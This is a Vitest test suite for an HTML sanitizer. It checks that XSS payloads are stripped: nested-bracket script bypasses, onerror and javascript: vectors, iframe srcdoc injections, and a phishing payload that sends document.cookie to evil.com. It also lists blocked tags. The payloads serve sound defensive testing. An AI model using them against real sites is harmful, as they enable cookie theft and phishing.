import { describe, test, expect, vi, afterEach } from "vitest";

// Mock the problematic imports before importing sanitize
vi.mock("src/messages/hooks", () => ({
	useMessageContext: vi.fn(() => ({
		config: {},
	})),
}));

import { sanitizeHTMLWithConfig } from "../src/sanitize";

describe("sanitizeHTMLWithConfig", () => {
	afterEach(() => {
		vi.restoreAllMocks();
	});

	describe("Basic Sanitization", () => {
		test("returns empty string for empty input", () => {
			const result = sanitizeHTMLWithConfig("", undefined);
			expect(result).toBe("");
		});

		test("preserves allowed HTML tags", () => {
			const input = "<b>bold</b> and <i>italic</i>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).toContain("<b>bold</b>");
			expect(result).toContain("<i>italic</i>");
		});

		test("removes script tags", () => {
			const input = "<script>alert('xss')</script>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<script>");
			expect(result).not.toContain("alert('xss')");
		});

		test("removes onclick attributes", () => {
			const input = '<div onclick="alert(1)">click me</div>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("onclick");
		});
	});

	describe("Iterative Sanitization (Bypass Prevention)", () => {
		test("handles nested angle bracket bypass attempt: <<b>i>", () => {
			const input = "<<b>i> test <</b>/i>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			// After iterative sanitization, the result should be stable
			// and not contain any unescaped malicious tags
			const secondPass = sanitizeHTMLWithConfig(result, undefined);
			expect(result).toBe(secondPass);
		});

		test("sanitization result is stable (idempotent)", () => {
			const testCases = [
				"<<b>i> test <</b>/i>",
				"<<<script>script>alert(1)<</script>/script>",
				"<div<script>>alert(1)</script</div>>",
				"<<img>img src=x onerror=alert(1)>",
				"<a<<b>href>javascript:alert(1)</a>",
			];

			for (const input of testCases) {
				const firstPass = sanitizeHTMLWithConfig(input, undefined);
				const secondPass = sanitizeHTMLWithConfig(firstPass, undefined);
				expect(firstPass).toBe(secondPass);
			}
		});

		test("does not produce valid HTML tags from obfuscated input", () => {
			const input = "<<script>script>alert('xss')<</script>/script>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toMatch(/<script[^>]*>/i);
		});

		test("handles deeply nested bypass attempts", () => {
			// Multiple layers of obfuscation
			const input = "<<<b>b>b>test</</b>/b>/b>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			const secondPass = sanitizeHTMLWithConfig(result, undefined);
			expect(result).toBe(secondPass);
		});
	});

	describe("Edge Cases", () => {
		test("handles input starting with closing tag", () => {
			const input = "</div>some text";
			const result = sanitizeHTMLWithConfig(input, undefined);
			// Should escape the angle brackets
			expect(result).toContain("&lt;");
			expect(result).toContain("&gt;");
		});

		test("handles multiple closing tags at start", () => {
			const input = "</span></div>content";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).toContain("&lt;");
		});

		test("preserves plain text", () => {
			const input = "Hello, this is plain text without any HTML";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).toBe(input);
		});

		test("handles mixed valid and invalid content", () => {
			const input = "<b>valid</b><script>invalid</script><i>also valid</i>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).toContain("<b>valid</b>");
			expect(result).toContain("<i>also valid</i>");
			expect(result).not.toContain("<script>");
		});
	});

	describe("Blocked Tags — WCH-SI10-001 hardening", () => {
		const blockedTags = [
			"iframe",
			"object",
			"embed",
			"applet",
			"frame",
			"frameset",
			"noframes",
			"meta",
			"base",
			"link",
			"style",
			"form",
		];

		for (const tag of blockedTags) {
			test(`strips <${tag}> elements`, () => {
				const input = `<${tag}>content</${tag}>`;
				const result = sanitizeHTMLWithConfig(input, undefined);
				expect(result).not.toMatch(new RegExp(`<${tag}[\\s>/]`, "i"));
			});
		}

		test("preserves text outside blocked tags", () => {
			const input = 'Before <form action="/steal">form content</form> After';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).toContain("Before");
			expect(result).toContain("After");
			expect(result).not.toContain("<form");
		});

		test("strips iframe including srcdoc attribute entirely", () => {
			const input = '<iframe srcdoc="<h1>content</h1>"></iframe>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("iframe");
			expect(result).not.toContain("srcdoc");
		});

		test("strips style elements to prevent CSS injection", () => {
			const input = "<style>body { background: url(javascript:alert(1)) }</style><p>safe</p>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<style");
			expect(result).not.toContain("javascript:");
			expect(result).toContain("<p>safe</p>");
		});

		test("strips base tag that would rewrite page URLs", () => {
			const input = '<base href="https://evil.com/"><a href="/path">link</a>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<base");
			expect(result).toContain("<a");
		});

		test("strips meta redirect", () => {
			const input = '<meta http-equiv="refresh" content="0;url=https://evil.com">';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<meta");
		});
	});

	describe("ALWAYS_BLOCKED_TAGS filter for customAllowedHtmlTags", () => {
		test("strips blocked tags from custom allowed list", () => {
			const input = "<iframe>malicious</iframe><b>safe</b>";
			const result = sanitizeHTMLWithConfig(input, ["iframe", "b"]);
			expect(result).not.toContain("iframe");
			expect(result).toContain("<b>safe</b>");
		});

		test("strips script from custom allowed list", () => {
			const input = "<script>alert(1)</script><span>safe</span>";
			const result = sanitizeHTMLWithConfig(input, ["script", "span"]);
			expect(result).not.toContain("<script");
			expect(result).toContain("<span>safe</span>");
		});

		test("strips noframes from custom allowed list", () => {
			const input = "<noframes>fallback</noframes><p>safe</p>";
			const result = sanitizeHTMLWithConfig(input, ["noframes", "p"]);
			expect(result).not.toContain("noframes");
			expect(result).toContain("<p>safe</p>");
		});

		test("strips structural tags (body, head, html) from custom allowed list", () => {
			for (const tag of ["body", "head", "html"]) {
				const input = `<${tag}>content</${tag}><span>safe</span>`;
				const result = sanitizeHTMLWithConfig(input, [tag, "span"]);
				expect(result).not.toMatch(new RegExp(`<${tag}[\\s>/]`, "i"));
				expect(result).toContain("<span>safe</span>");
			}
		});

		test("trims whitespace from tag names in custom list", () => {
			const input = "<iframe>malicious</iframe><b>safe</b>";
			// " iframe " with surrounding spaces should still be blocked
			const result = sanitizeHTMLWithConfig(input, [" iframe ", "b"]);
			expect(result).not.toContain("iframe");
			expect(result).toContain("<b>safe</b>");
		});

		test("handles non-string items in custom allowed list gracefully", () => {
			const input = "<b>bold</b>";
			// @ts-expect-error testing invalid runtime input
			const result = sanitizeHTMLWithConfig(input, ["b", null, 42, {}]);
			expect(result).toContain("<b>bold</b>");
		});

		test("handles non-array customAllowedHtmlTags gracefully", () => {
			const input = "<b>bold</b>";
			// @ts-expect-error testing invalid runtime input — falls back to default config
			const result = sanitizeHTMLWithConfig(input, "b");
			expect(result).toContain("<b>bold</b>");
		});

		test("handles empty custom allowed list", () => {
			const input = "<b>bold</b><i>italic</i>";
			const result = sanitizeHTMLWithConfig(input, []);
			// Empty list means no tags allowed — all stripped
			expect(result).not.toContain("<b>");
			expect(result).not.toContain("<i>");
			expect(result).toContain("bold");
			expect(result).toContain("italic");
		});
	});

	describe("Custom Allowed Tags", () => {
		test("respects custom allowed tags", () => {
			const input = "<div>div content</div><span>span content</span>";
			const customTags = ["div"];
			const result = sanitizeHTMLWithConfig(input, customTags);
			expect(result).toContain("<div>");
			expect(result).not.toContain("<span>");
		});

		test("custom tags also benefit from iterative sanitization", () => {
			const input = "<<div>div>test<</div>/div>";
			const customTags = ["div"];
			const result = sanitizeHTMLWithConfig(input, customTags);
			const secondPass = sanitizeHTMLWithConfig(result, customTags);
			expect(result).toBe(secondPass);
		});
	});

	describe("SSML Content Handling", () => {
		test("escapes SSML <speak> root element but preserves content", () => {
			const input = "<speak>Hello, how are you today?</speak>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			// <speak> is an HTMLUnknownElement, so the hook escapes it
			expect(result).toContain("&lt;speak&gt;");
			expect(result).toContain("&lt;/speak&gt;");
			expect(result).not.toContain("<speak>");
			expect(result).not.toContain("</speak>");
			expect(result).toContain("Hello, how are you today?");
		});

		test("strips SSML <voice> tags but preserves content", () => {
			const input = '<voice name="en-US-Wavenet-D">Welcome to the service.</voice>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<voice");
			expect(result).not.toContain("</voice>");
			expect(result).toContain("Welcome to the service.");
		});

		test("strips SSML <prosody> tags but preserves content", () => {
			const input = '<prosody rate="slow" pitch="low">Speaking slowly now.</prosody>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<prosody");
			expect(result).not.toContain("</prosody>");
			expect(result).toContain("Speaking slowly now.");
		});

		test("strips SSML <emphasis> tags but preserves content", () => {
			const input = '<emphasis level="strong">This is important!</emphasis>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<emphasis");
			expect(result).not.toContain("</emphasis>");
			expect(result).toContain("This is important!");
		});

		test("strips SSML <say-as> tags but preserves content", () => {
			const input = '<say-as interpret-as="date" format="mdy">12-25-2024</say-as>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<say-as");
			expect(result).not.toContain("</say-as>");
			expect(result).toContain("12-25-2024");
		});

		test("strips SSML <phoneme> tags but preserves content", () => {
			const input = '<phoneme alphabet="ipa" ph="təˈmeɪtoʊ">tomato</phoneme>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<phoneme");
			expect(result).not.toContain("</phoneme>");
			expect(result).toContain("tomato");
		});

		test("strips SSML <break> tags", () => {
			const input = 'Hello<break time="500ms"/>world';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<break");
			expect(result).toContain("Hello");
			expect(result).toContain("world");
		});

		test("handles complex nested SSML structure", () => {
			const input = `<speak>
				<voice name="en-US-Wavenet-D">
					Welcome! <prosody rate="slow">Please listen carefully.</prosody>
					<break time="1s"/>
					Your order number is <say-as interpret-as="cardinal">12345</say-as>.
				</voice>
			</speak>`;
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("<speak>");
			expect(result).not.toContain("<voice");
			expect(result).not.toContain("<prosody");
			expect(result).not.toContain("<break");
			expect(result).not.toContain("<say-as");
			expect(result).toContain("Welcome!");
			expect(result).toContain("Please listen carefully.");
			expect(result).toContain("12345");
		});

		test("handles SSML mixed with HTML - escapes unknown wrapper tags", () => {
			// When HTML is wrapped in unknown SSML tags like <speak>, the HTMLUnknownElement
			// hook escapes the wrapper tags while preserving inner text content
			const input =
				"<speak><b>Bold text</b> and <prosody rate='fast'>fast speech</prosody></speak>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			// The wrapper tags are escaped because <speak> is an unknown HTML element
			expect(result).toContain("&lt;speak&gt;");
			expect(result).not.toContain("<speak>");
			expect(result).toContain("Bold text");
			expect(result).toContain("fast speech");
		});

		test("handles HTML with inline SSML tags (no wrapper)", () => {
			// When SSML tags are inline without wrapping valid HTML, they get stripped
			const input = "<b>Bold text</b> and <prosody rate='fast'>fast speech</prosody>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).toContain("<b>Bold text</b>");
			expect(result).toContain("fast speech");
			expect(result).not.toContain("<prosody");
		});

		test("preserves HTML <sub> tag (also valid SSML)", () => {
			const input = "H<sub>2</sub>O is water";
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).toContain("<sub>2</sub>");
		});

		test("preserves HTML <audio> tag (also valid SSML)", () => {
			const input = '<audio src="sound.mp3">Audio fallback</audio>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).toContain("<audio");
			expect(result).toContain("Audio fallback");
		});

		test("handles SSML with nested bypass attempts", () => {
			const input = "<<speak>script>alert(1)<</speak>/script>";
			const result = sanitizeHTMLWithConfig(input, undefined);
			const secondPass = sanitizeHTMLWithConfig(result, undefined);
			expect(result).toBe(secondPass);
			expect(result).not.toMatch(/<script[^>]*>/i);
		});

		test("SSML sanitization result is stable (idempotent)", () => {
			const ssmlInputs = [
				"<speak>Hello world</speak>",
				'<voice name="test"><prosody rate="slow">Content</prosody></voice>',
				'<say-as interpret-as="telephone">+1-800-555-1234</say-as>',
				'<phoneme alphabet="x-sampa" ph="h@l\'oU">hello</phoneme>',
			];

			for (const input of ssmlInputs) {
				const firstPass = sanitizeHTMLWithConfig(input, undefined);
				const secondPass = sanitizeHTMLWithConfig(firstPass, undefined);
				expect(firstPass).toBe(secondPass);
			}
		});
	});

	describe("iframe srcdoc XSS Prevention", () => {
		// iframe is now removed from ALLOWED_TAGS (WCH-SI10-001). All iframe elements
		// are stripped entirely by DOMPurify, so srcdoc content is never rendered.
		// The tests below confirm iframe and srcdoc are fully removed.

		test("strips iframe element and srcdoc containing script", () => {
			const input =
				'<iframe srcdoc="<script>alert(parent.document.domain)</script>"></iframe>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("iframe");
			expect(result).not.toContain("srcdoc");
			expect(result).not.toContain("alert(");
		});

		test("strips iframe with HTML-encoded srcdoc payload", () => {
			const input =
				'341 TestTest <iframe srcdoc="&lt;script&gt;alert(parent.document.domain)&lt;/script&gt;"></iframe> TestTest';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("iframe");
			expect(result).not.toContain("srcdoc");
			expect(result).not.toContain("alert(");
			// Text outside the iframe is preserved
			expect(result).toContain("341 TestTest");
			expect(result).toContain("TestTest");
		});

		test("strips phishing iframe with script payload", () => {
			const input = `<iframe srcdoc="<script>document.location='https://evil.com/?c='+document.cookie</script>⚠️<div>Ihre Sitzung ist abgelaufen</div>"></iframe>`;
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("iframe");
			expect(result).not.toContain("srcdoc");
			expect(result).not.toContain("document.location");
			expect(result).not.toContain("document.cookie");
		});

		test("strips iframe with event handler in srcdoc", () => {
			const input = '<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("iframe");
			expect(result).not.toContain("onerror");
		});

		test("strips nested iframe payload", () => {
			const input = '<iframe srcdoc="<iframe src=javascript:alert(1)></iframe>"></iframe>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("iframe");
			expect(result).not.toContain("javascript:");
		});

		test("strips iframe even with valid srcdoc content", () => {
			const input =
				'<iframe srcdoc="<h1>Welcome</h1><p>This is <b>valid</b> content.</p>"></iframe>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("iframe");
			expect(result).not.toContain("srcdoc");
		});

		test("srcdoc sanitization result is stable (idempotent)", () => {
			const payloads = [
				'<iframe srcdoc="<script>alert(1)</script>"></iframe>',
				'<iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>',
				'<iframe srcdoc="<img src=x onerror=alert(1)>"></iframe>',
				'<iframe srcdoc="<body onload=alert(1)>"></iframe>',
			];

			for (const input of payloads) {
				const firstPass = sanitizeHTMLWithConfig(input, undefined);
				const secondPass = sanitizeHTMLWithConfig(firstPass, undefined);
				expect(firstPass).toBe(secondPass);
			}
		});

		test("handles iterative bypass attacks within srcdoc attributes", () => {
			const input = '<iframe srcdoc="<<script>script>alert(1)<</script>/script>"></iframe>';
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toMatch(/<script[^>]*>/i);
			expect(result).not.toContain("alert(1)");
			const secondPass = sanitizeHTMLWithConfig(result, undefined);
			expect(result).toBe(secondPass);
		});

		test("strips nested srcdoc iframe payload entirely", () => {
			const input = `<iframe srcdoc="<iframe srcdoc='<script>alert(1)</script>'></iframe>"></iframe>`;
			const result = sanitizeHTMLWithConfig(input, undefined);
			expect(result).not.toContain("iframe");
			expect(result).not.toMatch(/<script/i);
			expect(result).not.toContain("alert(1)");
		});
	});
});
